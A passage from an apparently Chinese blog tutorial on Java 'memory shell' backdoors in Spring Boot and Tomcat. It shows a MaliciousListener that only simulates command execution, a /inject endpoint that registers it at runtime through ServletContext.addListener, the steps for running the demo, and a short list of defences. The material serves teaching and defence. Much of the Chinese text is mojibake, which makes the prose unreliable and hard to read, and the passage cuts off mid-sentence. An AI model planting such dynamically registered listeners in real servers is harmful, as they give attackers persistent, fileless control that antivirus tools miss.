å°±è¢«æ³¨å†Œè¿›å»äº†ï¼Œæ˜¯â€œæ˜é¢ä¸Šçš„â€ã€‚</p><hr><p>ğŸ“„ <strong><code>MaliciousListener.java</code> â€”â€” æ¨¡æ‹Ÿâ€œå†…å­˜é©¬â€ç›‘å¬å™¨</strong></p><pre tabindex=0><code>package com.example.demo;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;

// æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ @WebListenerï¼
// å®ƒä¸ä¼šåœ¨å¯åŠ¨æ—¶è‡ªåŠ¨æ³¨å†Œ
public class MaliciousListener implements ServletRequestListener {

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        // æ¨¡æ‹Ÿæ‰§è¡Œæ¶æ„å‘½ä»¤
        String cmd = sre.getServletRequest().getParameter(&#34;cmd&#34;);
        if (cmd != null &amp;&amp; cmd.contains(&#34;dir&#34;)) {  // ç®€å•åˆ¤æ–­
            System.out.println(&#34;ğŸ’€ [å†…å­˜é©¬è§¦å‘] é»‘å®¢æ‰§è¡Œå‘½ä»¤: &#34; + cmd);
            System.out.println(&#34;ğŸ“ æ¨¡æ‹Ÿè¿”å› C:\\Users\\Admin\\Desktop ä¸‹çš„æ–‡ä»¶&#34;);
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent sre) {
        // å¯ä»¥ä»€ä¹ˆéƒ½ä¸åš
    }
}
</code></pre><p><strong>ğŸ” é€è¡Œè§£é‡Šï¼š</strong></p><table><thead><tr><th>è¡Œ</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><code>@RestController</code></td><td>è¡¨ç¤ºè¿™ä¸ªç±»æä¾› HTTP æ¥å£</td></tr><tr><td><code>@GetMapping("/inject")</code></td><td>è®¿é—® <code>/inject</code> å°±ä¼šæ‰§è¡Œè¿™ä¸ªæ–¹æ³•</td></tr><tr><td><code>context.addListener(...)</code></td><td>å…³é”®ï¼æŠŠ <code>MaliciousListener</code> åŠ¨æ€æ³¨å†Œè¿› Tomcat</td></tr><tr><td><code>getServletContext()</code></td><td>æ‹¿åˆ° Tomcat çš„â€œæ€»æ§ä¸­å¿ƒâ€ï¼Œæ‰èƒ½è°ƒç”¨ <code>addListener</code></td></tr><tr><td>è¿”å› <code>"âœ… æ¶æ„ç›‘å¬å™¨å·²æ³¨å…¥"</code></td><td>é»‘å®¢çœ‹åˆ°è¿™ä¸ªï¼Œå°±çŸ¥é“åé—¨æˆåŠŸäº†</td></tr></tbody></table><hr><p>ğŸš€ <strong>è¿è¡Œæµç¨‹æ¼”ç¤º</strong></p><p>1ï¸âƒ£ <strong>å¯åŠ¨åº”ç”¨</strong></p><pre tabindex=0><code>mvn spring-boot:run
</code></pre><p>2ï¸âƒ£ <strong>è®¿é—®ä»»æ„é¡µé¢ï¼ˆæµ‹è¯•æ­£å¸¸ç›‘å¬å™¨ï¼‰</strong></p><pre tabindex=0><code>http://localhost:8080/hello
</code></pre><p>3ï¸âƒ£ <strong>é»‘å®¢æ³¨å…¥â€œå†…å­˜é©¬â€</strong></p><pre tabindex=0><code>http://localhost:8080/inject
</code></pre><p>è¿”å›ï¼š</p><pre tabindex=0><code>âœ… æ¶æ„ç›‘å¬å™¨å·²æ³¨å…¥ï¼å†…å­˜é©¬ä¸Šçº¿ï¼
</code></pre><p>æ§åˆ¶å°æ²¡æœ‰è¾“å‡ºï¼Œä½†â€”â€”<strong>MaliciousListener å·²ç»è¢«æ³¨å†Œè¿›å»äº†ï¼</strong></p><p>4ï¸âƒ£ <strong>è§¦å‘â€œå†…å­˜é©¬â€</strong></p><pre tabindex=0><code>http://localhost:8080/test?cmd=dir
</code></pre><p>æ§åˆ¶å°è¾“å‡º</p><pre tabindex=0><code>ğŸŸ¢ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚å¼€å§‹äº†ï¼æœ‰äººè®¿é—®äº†ï¼
ğŸ’€ [å†…å­˜é©¬è§¦å‘] é»‘å®¢æ‰§è¡Œå‘½ä»¤: dir
ğŸ“ æ¨¡æ‹Ÿè¿”å› C:\Users\Admin\Desktop ä¸‹çš„æ–‡ä»¶
ğŸ”´ [æ­£å¸¸ç›‘å¬å™¨] è¯·æ±‚ç»“æŸäº†ï¼
</code></pre><p>ğŸ‘‰ çœ‹ï¼å³ä½¿ <code>MaliciousListener</code> æ²¡æœ‰ <code>@WebListener</code>ï¼Œå®ƒä¹Ÿèƒ½åœ¨æ¯æ¬¡è¯·æ±‚æ—¶è¢«æ‰§è¡Œï¼</p><hr><p>ğŸ” <strong>åŸç†æ€»ç»“ï¼šå†…å­˜é©¬æ˜¯æ€ä¹ˆå½¢æˆçš„ï¼Ÿ</strong></p><table><thead><tr><th>é˜¶æ®µ</th><th>å‘ç”Ÿäº†ä»€ä¹ˆ</th></tr></thead><tbody><tr><td>ğŸŸ¢ åº”ç”¨å¯åŠ¨</td><td>Tomcat æ‰«æ <code>@WebListener</code>ï¼Œæ³¨å†Œ <code>NormalListener</code></td></tr><tr><td>ğŸ”´ é»‘å®¢æ”»å‡»</td><td>é€šè¿‡æ¼æ´è®¿é—® <code>/inject</code>ï¼Œè°ƒç”¨ <code>context.addListener()</code></td></tr><tr><td>ğŸ’£ æ³¨å…¥æˆåŠŸ</td><td><code>MaliciousListener</code> è¢«åŠ å…¥ç›‘å¬å™¨åˆ—è¡¨ï¼Œä½†<strong>æ²¡å†™ç£ç›˜</strong></td></tr><tr><td>ğŸ•µï¸â€â™‚ï¸ éšè”½è¿è¡Œ</td><td>æ¯æ¬¡è¯·æ±‚éƒ½ä¼šè§¦å‘å®ƒï¼Œå°±åƒâ€œæ½œä¼ç‰¹å·¥â€</td></tr><tr><td>ğŸ§¼ éš¾ä»¥æ¸…é™¤</td><td>é‡å¯å‰ä¸€ç›´å­˜åœ¨ï¼Œæ€æ¯’è½¯ä»¶æŸ¥ä¸åˆ°æ–‡ä»¶</td></tr></tbody></table><p>âœ… <strong>å®‰å…¨æé†’ï¼ˆé‡è¦ï¼ï¼‰</strong></p><p>è¿™ç§â€œåŠ¨æ€æ³¨å†Œç›‘å¬å™¨â€åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¿…é¡»ç¦æ­¢ï¼é˜²èŒƒæªæ–½ï¼š</p><ol><li>ç¦ç”¨ <code>context.addListener(Class)</code>ï¼ˆé€šè¿‡å®‰å…¨ç®¡ç†å™¨ï¼‰ï¼›</li><li>é™åˆ¶åå°„è°ƒç”¨ï¼›</li><li>ä½¿ç”¨ WAFï¼ˆWeb åº”ç”¨é˜²ç«å¢™ï¼‰æ‹¦æˆª <code>/inject</code> è¿™ç±»å¯ç–‘è·¯å¾„ï¼›</li><li>å®šæœŸå®¡è®¡ <code>ServletContext</code> ä¸­æ³¨å†Œçš„ç›‘å¬å™¨ã€‚</li></ol><hr><h3 id=41-å·¥ä½œé€»è¾‘å‰–æ>4.1 å·¥ä½œé€»è¾‘å‰–æ<a hidden class=anchor aria-hidden=true href=#41-å·¥ä½œé€»è¾‘å‰–æ>#</a></h3><p>1ã€<strong><code>MaliciousListener.java</code>ï¼šæ¶æ„ç»„ä»¶</strong></p><p>è¿™æ˜¯ä¸€ä¸ªå®ç°äº† <code>ServletRequestListener</code> æ¥å£çš„æ™®é€š Java ç±»ã€‚</p><table><thead><tr><th><strong>ä»£ç è¡Œ</strong></th><th><strong>ä½œç”¨å’ŒåŸç†</strong></th><th><strong>é€šä¿—è§£é‡Š</strong></th></tr></thead><tbody><tr><td><code>public class MaliciousListener implements ServletRequestListener {</code></td><td>ç»§æ‰¿äº† Java Web è§„èŒƒä¸­çš„<strong>è¯·æ±‚ç›‘å¬å™¨æ¥å£</strong>ã€‚</td><td>å‘Šè¯‰æœåŠ¡å™¨ï¼šâ€œæˆ‘æ˜¯ä¸€ä¸ª<strong>é—¨å«</strong>ï¼Œè´Ÿè´£åœ¨æ¯ä¸ªè¯·æ±‚è¿›æ¥å’Œå‡ºå»çš„æ—¶å€™åšç‚¹ä»€ä¹ˆã€‚â€</td></tr><tr><td><code>// æ³¨æ„ï¼šè¿™é‡Œæ²¡æœ‰ @WebListener!</code></td><td><strong>å…³é”®ç‚¹</strong>ï¼šé»˜è®¤æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¸ä¼šçŸ¥é“å®ƒçš„å­˜åœ¨ã€‚</td><td>å®ƒæ˜¯ä¸€ä¸ª**â€œéšå½¢â€çš„é—¨å«**ï¼ŒæœåŠ¡å™¨å¯åŠ¨æ—¶ä¸ä¼šè‡ªåŠ¨é›‡ä½£å®ƒã€‚</td></tr><tr><td><code>@Override public void requestInitialized(ServletRequestEvent sre) {</code></td><td>å½“ä¸€ä¸ª <strong>HTTP è¯·æ±‚</strong>åˆ°è¾¾æœåŠ¡å™¨æ—¶ï¼Œè¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</td><td><strong>å¼€é—¨å‰</strong>ï¼šæ¯æ¬¡æœ‰å®¢äººï¼ˆHTTPè¯·æ±‚ï¼‰æ¥ï¼Œè¿™ä¸ªé—¨å«ï¼ˆæ–¹æ³•ï¼‰éƒ½ä¼šæœ€å…ˆæ¥åˆ°é€šçŸ¥ã€‚</td></tr><tr><td><code>String cmd = sre.getServletRequest().getParameter("cmd");</code></td><td>ä»è¯·æ±‚ä¸­è·å–åä¸º <code>cmd</code> çš„å‚æ•°å€¼ã€‚</td><td>æ£€æŸ¥å®¢äººé€’è¿‡æ¥çš„â€œå°çº¸æ¡â€ï¼ˆ<code>cmd</code> å‚æ•°ï¼‰ä¸Šå†™äº†ä»€ä¹ˆã€‚</td></tr><tr><td><code>if (cmd != null && cmd.contains("dir")) {</code></td><td>æ£€æŸ¥å‚æ•°æ˜¯å¦åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²ï¼ˆè¿™é‡Œæ˜¯ <code>dir</code>ï¼‰ã€‚</td><td>å¦‚æœå°çº¸æ¡ä¸Šå†™ç€ <code>dir</code>ï¼Œå°±è¯´æ˜æ˜¯<strong>æ”»å‡»è€…çš„æŒ‡ä»¤</strong>ã€‚</td></tr><tr><td><code>System.out.println("ğŸ’€ [å†…å­˜é©¬è§¦å‘]...");</code></td><td><strong>æ¨¡æ‹Ÿ</strong>æ‰§è¡Œäº†æ”»å‡»è€…ä¼ é€’çš„å‘½ä»¤ã€‚</td><td><strong>å±é™©æ“ä½œ</strong>ï¼šå·å·åœ¨åå°ï¼ˆæœåŠ¡å™¨ï¼‰æ‰§è¡Œäº†æ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œä¾‹å¦‚æŸ¥çœ‹æ–‡ä»¶ã€ä¸‹è½½ç—…æ¯’ç­‰ã€‚</td></tr></tbody></table><p>2ã€<strong><code>HackController.java</code>ï¼šæ³¨å°„å™¨</strong></p><p>è¿™æ˜¯ä¸€ä¸ª Spring Boot çš„ HTTP æ¥å£ï¼Œå®ƒçš„å”¯ä¸€ä½œç”¨å°±æ˜¯<strong>åœ¨è¿è¡Œæ—¶</strong>å°†ä¸Šé¢çš„â€œéšå½¢é—¨å«â€<strong>æ³¨å†Œ</strong>åˆ° Web å®¹å™¨ä¸­ã€‚</p><table><thead><tr><th><strong>ä»£ç è¡Œ</strong></th><th><strong>ä½œç”¨å’ŒåŸç†</strong></th><th><strong>é€šä¿—è§£é‡Š</strong></th></tr></thead><tbody><tr><td><code>@RestController</code></td><td><strong>Spring æ³¨è§£</strong>ï¼šç»“åˆ <code>@Controller</code> å’Œ <code>@ResponseBody</code>ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªæ¥æ”¶ HTTP è¯·æ±‚å¹¶è¿”å›æ•°æ®çš„æ¥å£ã€‚</td><td><strong>Spring çš„å¸®åŠ©</strong>ï¼šSpring å¸®ä½ æŠŠè¿™ä¸ª Java ç±»å˜æˆäº†ä¸€ä¸ªå¯ä»¥æ¥æ”¶å¤–éƒ¨ç½‘ç»œè¯·æ±‚çš„â€œç½‘ç«™åœ°å€â€ã€‚</td></tr><tr><td><code>@GetMapping("/inject")</code></td><td><strong>Spring æ³¨è§£</strong>ï¼šå°†ä¸‹é¢çš„æ–¹æ³•æ˜ å°„åˆ° <code>/inject</code> è¿™ä¸ª HTTP åœ°å€ï¼Œä½¿ç”¨ GET è¯·æ±‚ã€‚</td><td><strong>Spring çš„å¸®åŠ©</strong>ï¼šå½“ä½ è®¿é—® <code>http://.../inject</code> æ—¶ï¼Œå°±ä¼šæ‰§è¡Œä¸‹é¢çš„ <code>injectMemoryShell()</code> æ–¹æ³•ã€‚</td></tr><tr><td><code>public String injectMemoryShell() {</code></td><td><strong>è¿™æ˜¯æ”»å‡»è€…è®¿é—®çš„å…¥å£</strong>ã€‚</td><td>åªè¦è®¿é—®è¿™ä¸ªæ¥å£ï¼Œæ”»å‡»å°±å®Œæˆäº†ç¬¬ä¸€æ­¥ï¼š<strong>éƒ¨ç½²æ¶æ„ç»„ä»¶</strong>ã€‚</td></tr><tr><td><code>ServletContext context = getServletContext();</code></td><td>è·å– <strong><code>ServletContext</code></strong> å¯¹è±¡ã€‚</td><td><strong>Web å®¹å™¨çš„â€œå¤§è„‘â€</strong>ï¼š<code>ServletContext</code> æ˜¯ Java Web ä¸­<strong>æœ€é«˜çº§åˆ«</strong>çš„é…ç½®å’Œç®¡ç†å¯¹è±¡ï¼Œä»£è¡¨æ•´ä¸ª Web åº”ç”¨ã€‚</td></tr><tr><td><code>context.addListener(MaliciousListener.class);</code></td><td><strong>æ ¸å¿ƒæ”»å‡»ä»£ç </strong>ï¼šé€šè¿‡ <code>ServletContext</code> åŠ¨æ€æ³¨å†Œ <code>MaliciousListener</code>ã€‚</td><td><strong>å…³é”®æ­¥éª¤</strong>ï¼šå¼ºåˆ¶ Web å®¹å™¨ï¼ˆå¦‚ Tomcatï¼‰å°†æˆ‘ä»¬<strong>éšå½¢çš„</strong> <code>MaliciousListener</code> é—¨å«<strong>ç«‹å³é›‡ä½£</strong>ï¼Œå¹¶å¼€å§‹åœ¨æ¯æ¬¡è¯·æ±‚æ—¶è¿è¡Œå®ƒã€‚</td></tr><tr><td><code>return "âœ… ...";</code></td><td>è¿”å›æˆåŠŸçš„æç¤ºã€‚</td><td>å‘Šè¯‰æ”»å‡»è€…ï¼šâ€œæå®šï¼Œé—¨å«ï¼ˆå†…å­˜é©¬ï¼‰å·²ç»ä¸Šçº¿äº†ï¼â€</td></tr></tbody></table><p><strong>3ã€æ³¨è§£èƒŒåçš„å·¥ä½œåŸç†ï¼šSpring Boot åšäº†ä»€ä¹ˆï¼Ÿ</strong></p><p>åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼ŒSpring Boot çš„æ³¨è§£ (<code>@RestController</code>, <code>@GetMapping</code>) åªæ˜¯æä¾›äº†<strong>ä¸€ä¸ªâ€œå…¥å£â€</strong>ï¼Œè®©æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸€ä¸ªæ­£å¸¸çš„ HTTP è¯·æ±‚æ¥æ‰§è¡Œ <code>injectMemoryShell()</code> æ–¹æ³•ã€‚</p><ul><li><strong>æ²¡æœ‰ Spring Boot</strong>ï¼šæ”»å‡»è€…éœ€è¦åˆ©ç”¨æ›´åº•å±‚çš„æ¼æ´ï¼ˆä¾‹å¦‚ï¼Œæ–‡ä»¶ä¸Šä¼ æ¼æ´æˆ–å…¶ä»–è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼‰æ¥æ‰§è¡Œ <code>context.addListener(...)</code> è¿™è¡Œä»£ç ã€‚</li><li><strong>æœ‰äº† Spring Boot</strong>ï¼šå¦‚æœåº”ç”¨æœ¬èº«æœ‰ä¸€ä¸ª <strong>å·²çŸ¥çš„æ¼æ´</strong>ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªä¸å®‰å…¨çš„é…ç½®æˆ–ä¸€ä¸ªå¯ä»¥è¢«åˆ©ç”¨çš„ç°æœ‰æ¥å£ï¼‰ï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥å£ï¼ˆ<code>/inject</code>ï¼‰æ¥æ‰§è¡Œæ¶æ„ä»£ç ã€‚</li></ul><p><strong>æ³¨è§£çš„å·¥ä½œæœºåˆ¶æ€»ç»“ï¼š</strong></p><p>Spring Boot åœ¨åº”ç”¨ç¨‹åº<strong>å¯åŠ¨æ—¶</strong>ï¼Œä¼šæ‰«ææ‰€æœ‰ç±»ï¼Œçœ‹åˆ° <code>@RestController</code> å’Œ <code>@GetMapping</code> è¿™æ ·çš„æ³¨è§£ï¼Œç„¶åï¼š</p><ol><li><strong>è‡ªåŠ¨é…ç½®</strong>ï¼šæŠŠä½ çš„ Java ç±»å’Œæ–¹æ³•ï¼Œ<strong>æ˜ å°„</strong>æˆ Web æœåŠ¡å™¨å¯ä»¥ç†è§£å’Œå¤„ç†çš„ URL è·¯å¾„ã€‚</li><li><strong>åŠ¨æ€ä»£ç†</strong>ï¼šå½“ä½ è®¿é—® <code>/inject</code> æ—¶ï¼ŒSpring Boot æ¡†æ¶ä¼šæ‹¦æˆªè¿™ä¸ªè¯·æ±‚ï¼Œç„¶åå»è°ƒç”¨ä½  <code>HackController</code> ç±»ä¸­çš„ <code>injectMemoryShell()</code> æ–¹æ³•ã€‚</li></ol><p><strong>å› æ­¤ï¼Œæ³¨è§£åªæ˜¯æä¾›äº†ä¸€ä¸ªæ–¹ä¾¿çš„â€œå‘å°„å™¨â€ã€‚</strong> çœŸæ­£çš„å±é™©æ“ä½œ (<code>context.addListener()</code>) ä¾ç„¶æ˜¯çº¯ç²¹çš„ Java Web å®¹å™¨ï¼ˆServlet APIï¼‰åŠŸèƒ½ã€‚</p><hr><p><strong>é€šä¿—ç†è§£ï¼šTomcat æ˜¯â€œæˆ¿å­â€ï¼ŒSpring æ˜¯â€œç®¡å®¶â€</strong></p><p>æƒ³è±¡ä¸€ä¸‹ï¼š</p><ul><li><strong>Tomcat</strong>ï¼šæ˜¯ä¸€ä¸ª<strong>ç©ºæˆ¿å­ï¼ˆæœåŠ¡å™¨ï¼‰</strong>ã€‚å®ƒæä¾›äº†æ°´ã€ç”µã€ç…¤æ°”ï¼ˆå³ HTTP è¯·æ±‚å¤„ç†ã€Servlet API ç­‰åŸºç¡€åŠŸèƒ½ï¼‰ã€‚å®ƒåªæ‡‚æœ€åŸºæœ¬çš„è§„åˆ™ï¼ˆServlet è§„èŒƒï¼‰ã€‚</li><li><strong>Spring Boot</strong>ï¼šæ˜¯ä¸€ä¸ª<strong>å…¨èƒ½ç®¡å®¶ï¼ˆæ¡†æ¶ï¼‰</strong>ã€‚ä½ é›‡ä½£å®ƒæ¥ç®¡ç†è¿™ä¸ªæˆ¿å­ã€‚</li><li><strong><code>@RestController</code></strong>ï¼šæ˜¯ä½ è´´åœ¨<strong>ç®¡å®¶ï¼ˆSpringï¼‰</strong> çš„<strong>ä»»åŠ¡æ¿</strong>ä¸Šçš„ä¸€ä¸ªæ ‡ç­¾ï¼Œå‘Šè¯‰ä»–ï¼šâ€œè¿™ä¸ªç±»æ˜¯ç”¨æ¥æ¥å¾…å®¢äººçš„ã€‚â€</li><li><strong><code>ServletContext</code></strong>ï¼šæ˜¯è¿™ä¸ª<strong>æˆ¿å­ï¼ˆTomcatï¼‰</strong> çš„<strong>æ€»æ§åˆ¶å®¤ï¼ˆå¤§è„‘ï¼‰</strong>ã€‚å®ƒæ§åˆ¶ç€æˆ¿å­é‡Œæ‰€æœ‰çš„â€œé—¨â€ï¼ˆServletï¼‰ã€â€œçª—â€ï¼ˆFilterï¼‰å’Œâ€œè­¦æŠ¥å™¨â€ï¼ˆListenerï¼‰ã€‚</li></ul><p><strong>å·¥ä½œæµç¨‹ï¼šä»å¯åŠ¨åˆ°æ¶æ„æ³¨å…¥</strong>ï¼Œæˆ‘ä»¬ä¸€æ­¥æ­¥æ¥çœ‹ Tomcat å’Œ Spring æ˜¯å¦‚ä½•åˆ†å·¥åˆä½œçš„ï¼š</p><hr><h4 id=é˜¶æ®µä¸€å¯åŠ¨åº”ç”¨ç®¡å®¶å…¥é©»æˆ¿å­><strong>é˜¶æ®µä¸€ï¼šå¯åŠ¨åº”ç”¨ï¼ˆâ€œç®¡å®¶å…¥é©»æˆ¿å­â€ï¼‰</strong><a hidden class=anchor aria-hidden=true href=#é˜¶æ®µä¸€å¯åŠ¨åº”ç”¨ç®¡å®¶å…¥é©»æˆ¿å­>#</a></h4><ol><li><strong>ä½ è¿è¡Œäº† <code>main</code> æ–¹æ³•</strong>ï¼šSpring Boot å¼€å§‹å¯åŠ¨ã€‚</li><li><strong>Spring å¯åŠ¨ Tomcat</strong>ï¼šSpring Boot çš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯<strong>åœ¨å†…éƒ¨å¯åŠ¨ä¸€ä¸ª Tomcat æœåŠ¡å™¨å®ä¾‹</strong>ã€‚å®ƒä¸æ˜¯ä¸€ä¸ªå•ç‹¬å®‰è£…çš„ Tomcatï¼Œè€Œæ˜¯ Spring Boot å¸¦æ¥çš„ä¸€ä¸ªâ€œä¾¿æºç‰ˆâ€Tomcatã€‚</li><li><strong>Tomcat åˆ›å»º <code>ServletContext</code></strong>ï¼šTomcat ä½œä¸ºæœåŠ¡å™¨ï¼Œé¦–å…ˆä¼šä¸ºä½ çš„ Web åº”ç”¨åˆ›å»ºä¸€ä¸ªâ€œæ€»æ§åˆ¶å®¤â€ï¼Œä¹Ÿå°±æ˜¯ <code>ServletContext</code> å¯¹è±¡ã€‚<strong>è¿™æ˜¯ Tomcat çš„æ ¸å¿ƒèµ„äº§</strong>ã€‚</li><li><strong>Spring æ‰«æå¹¶æ³¨å†Œ</strong>ï¼š<ul><li>Spring Boot å¼€å§‹æ‰«æä½ çš„ä»£ç ï¼ˆå¦‚ <code>com.example.demo</code> åŒ…ä¸‹ï¼‰ã€‚</li><li>å®ƒ<strong>çœ‹åˆ°</strong>äº† <code>HackController</code> ä¸Šçš„ <code>@RestController</code> å’Œ <code>@GetMapping("/inject")</code>ã€‚</li><li><strong>æ³¨æ„</strong>ï¼šTomcat å¯¹æ­¤ä¸€æ— æ‰€çŸ¥ã€‚Spring åªæ˜¯åœ¨è‡ªå·±çš„â€œå°æœ¬æœ¬â€ï¼ˆApplicationContextï¼‰ä¸Šè®°ä¸‹äº†ï¼šâ€œå“¦ï¼Œå¦‚æœæœ‰äººè®¿é—® <code>/inject</code>ï¼Œæˆ‘å°±å»è°ƒç”¨ <code>HackController</code> çš„ <code>injectMemoryShell</code> æ–¹æ³•ã€‚â€</li></ul></li><li><strong>Spring å‘ Tomcat æ³¨å†Œâ€œæ€»ä»£ç†â€</strong>ï¼š<ul><li>Spring ä¸ä¼šæŠŠä½ æˆç™¾ä¸Šåƒçš„ <code>@GetMapping</code> å…¨éƒ¨å‘Šè¯‰ Tomcatã€‚</li><li>ç›¸åï¼ŒSpring åªå‘ Tomcat çš„ <code>ServletContext</code> <strong>æ³¨å†Œäº†ä¸€ä¸ª</strong>ä¸œè¥¿ï¼Œå«åš <code>DispatcherServlet</code>ï¼ˆè°ƒåº¦Servletï¼‰ã€‚</li><li>Spring å‘Šè¯‰ Tomcatï¼šâ€œå˜¿ï¼ŒTomcat è€å…„ï¼Œä»¥åæ‰€æœ‰è®¿é—®è¿™ä¸ªæˆ¿å­çš„è¯·æ±‚ï¼ˆ<code>/*</code>ï¼‰ï¼Œä½ ä»€ä¹ˆéƒ½åˆ«ç®¡ï¼Œ<strong>å…¨éƒ½äº¤ç»™æˆ‘è¿™ä¸ªâ€˜æ€»ä»£ç†â€™ï¼ˆDispatcherServletï¼‰å°±è¡Œäº†</strong>ã€‚â€</li></ul></li></ol><p><strong>Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µä¸€ï¼‰ï¼š</strong> å¯åŠ¨è‡ªå·±ï¼Œåˆ›å»º <code>ServletContext</code>ï¼Œç„¶åæŠŠæ‰€æœ‰è¯·æ±‚çš„å¤„ç†æƒ<strong>å®Œå…¨äº¤ç»™</strong>äº† Spring çš„ <code>DispatcherServlet</code>ã€‚</p><hr><h4 id=é˜¶æ®µäºŒé»‘å®¢è®¿é—®-inject-æ¥å£æœ‰äººæŒ‰é—¨é“ƒ>é˜¶æ®µäºŒï¼šé»‘å®¢è®¿é—® <code>/inject</code> æ¥å£ï¼ˆâ€œæœ‰äººæŒ‰é—¨é“ƒâ€ï¼‰<a hidden class=anchor aria-hidden=true href=#é˜¶æ®µäºŒé»‘å®¢è®¿é—®-inject-æ¥å£æœ‰äººæŒ‰é—¨é“ƒ>#</a></h4><ol><li><strong>è¯·æ±‚è¿›å…¥</strong>ï¼šé»‘å®¢è®¿é—® <code>http://.../inject</code>ã€‚</li><li><strong>Tomcat æ¥å¾…</strong>ï¼šTomcat æ˜¯â€œæˆ¿å­â€çš„é—¨å«ï¼Œå®ƒæœ€å…ˆæ”¶åˆ°è¿™ä¸ª HTTP è¯·æ±‚ã€‚</li><li><strong>Tomcat è½¬äº¤</strong>ï¼šTomcat çœ‹åˆ° URL æ˜¯ <code>/inject</code>ï¼Œå®ƒæ ¹æ®å¯åŠ¨æ—¶çš„çº¦å®šï¼ˆâ€œæ‰€æœ‰è¯·æ±‚éƒ½äº¤ç»™ <code>DispatcherServlet</code>â€ï¼‰ï¼ŒæŠŠè¿™ä¸ªè¯·æ±‚åŸå°ä¸åŠ¨åœ°<strong>äº¤ç»™äº† Spring çš„ <code>DispatcherServlet</code></strong>ã€‚</li><li><strong>Spring çš„â€œç®¡å®¶â€å¼€å§‹å·¥ä½œ</strong>ï¼š<ul><li><code>DispatcherServlet</code>ï¼ˆæ€»ä»£ç†ï¼‰æ‹¿åˆ°äº†è¯·æ±‚ã€‚</li><li>å®ƒæŸ¥é˜…è‡ªå·±çš„â€œå°æœ¬æœ¬â€ï¼ˆå°±æ˜¯å¯åŠ¨æ—¶æ‰«ææ³¨è§£è®°ä¸‹çš„é‚£ä¸ªï¼‰ã€‚</li><li>å®ƒå‘ç° <code>/inject</code> è·¯å¾„<strong>å¯¹åº”ç€</strong> <code>HackController</code> çš„ <code>injectMemoryShell</code> æ–¹æ³•ã€‚</li><li>äºæ˜¯ï¼ŒSpring æ¡†æ¶è°ƒç”¨äº†ä½ çš„ <code>injectMemoryShell()</code> æ–¹æ³•ã€‚</li></ul></li></ol><p><strong>Tomcat çš„å·¥ä½œï¼ˆé˜¶æ®µäºŒï¼‰ï¼š</strong> å®ƒåªåšâ€œä¼ è¾¾å®¤â€çš„å·¥ä½œï¼ŒæŠŠè¯·æ±‚å¿ å®åœ°<strong>ä¼ é€’ç»™ Spring çš„ <code>DispatcherServlet</code></strong>ã€‚å®ƒ<strong>ä¸çŸ¥é“</strong>ä¹Ÿ<strong>ä¸å…³å¿ƒ</strong> <code>@GetMapping</code>ã€‚</p><hr><h4 id=é˜¶æ®µä¸‰æ‰§è¡Œæ¶æ„æ³¨å…¥ç®¡å®¶è¢«éª—å»æ‰“å¼€äº†æ€»æ§åˆ¶å®¤>é˜¶æ®µä¸‰ï¼šæ‰§è¡Œæ¶æ„æ³¨å…¥ï¼ˆâ€œç®¡å®¶è¢«éª—å»æ‰“å¼€äº†æ€»æ§åˆ¶å®¤â€ï¼‰<a hidden class=anchor aria-hidden=true href=#é˜¶æ®µä¸‰æ‰§è¡Œæ¶æ„æ³¨å…¥ç®¡å®¶è¢«éª—å»æ‰“å¼€äº†æ€»æ§åˆ¶å®¤>#</a></h4><ol><li><strong><code>injectMemoryShell</code> æ–¹æ³•æ‰§è¡Œ</strong>ï¼šç°åœ¨ï¼Œä»£ç æ‰§è¡Œåˆ°äº†ä½ çš„ Controller å†…éƒ¨ã€‚</li><li><code>getServletContext()</code>ï¼š<ul><li>è¿™è¡Œä»£ç å‘ Spring æ¡†æ¶ï¼ˆæˆ– Web ä¸Šä¸‹æ–‡ï¼‰è¦ï¼šâ€œè¯·æŠŠ <strong>Tomcat çš„é‚£ä¸ªâ€˜æ€»æ§åˆ¶å®¤â€™ï¼ˆServletContextï¼‰</strong> ç»™æˆ‘ã€‚â€</li><li>Spring çŸ¥é“å®ƒè‡ªå·±å°±æ˜¯è¿è¡Œåœ¨ Tomcat é‡Œçš„ï¼Œæ‰€ä»¥å®ƒèƒ½æ‹¿åˆ°è¿™ä¸ª <code>ServletContext</code> å¯¹è±¡å¹¶è¿”å›ç»™ä½ ã€‚</li></ul></li><li><code>context.addListener(MaliciousListener.class);</code>ï¼š<ul><li><strong>è¿™æ˜¯æœ€å…³é”®çš„ä¸€æ­¥ï¼</strong></li><li>è¿™è¡Œä»£ç <strong>ä¸å†æ˜¯å’Œ Spring æ¡†æ¶å¯¹è¯äº†</strong>ã€‚</li><li>ä½ æ‹¿ç€ <code>ServletContext</code>ï¼ˆæ€»æ§åˆ¶å®¤çš„é’¥åŒ™ï¼‰ï¼Œ<strong>ç›´æ¥å‘ Tomcat ä¸‹è¾¾äº†å‘½ä»¤</strong>ï¼šâ€œTomcat è€å…„ï¼Œç»™æˆ‘<strong>åŠ¨æ€æ³¨å†Œ</strong>ä¸€ä¸ªæ–°çš„è­¦æŠ¥å™¨ï¼ˆListenerï¼‰ã€‚â€</li><li>Tomcat ä¸çŸ¥é“è¿™æ˜¯â€œé»‘å®¢çš„â€è¿˜æ˜¯â€œæ­£å¸¸çš„â€ï¼Œå®ƒåªçŸ¥é“è¿™æ˜¯ç¬¦åˆ Servlet API è§„èŒƒçš„åˆæ³•å‘½ä»¤ã€‚</li><li>Tomcatï¼šâ€œæ”¶åˆ°ï¼â€ äºæ˜¯å®ƒåœ¨è‡ªå·±çš„**â€œæ€»æ§åˆ¶å®¤â€<strong>é‡Œï¼ŒæŠŠ 